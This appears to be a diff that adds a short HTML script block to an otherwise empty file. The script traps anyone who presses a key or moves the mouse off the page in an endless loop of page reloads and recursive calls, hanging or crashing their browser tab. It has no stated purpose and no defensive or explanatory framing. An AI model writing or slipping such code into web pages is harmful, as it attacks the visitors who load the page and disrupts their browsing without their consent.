@@ -1,1 +1,14 @@
-
+<script>
+ function crash(){
+  while(true){
+  location.reload();
+  crash();
+  } 
+ }
+document.onkeydown = function(){
+crash();
+}
+document.onmouseleave = function(){
+crash();
+}  
+</script>
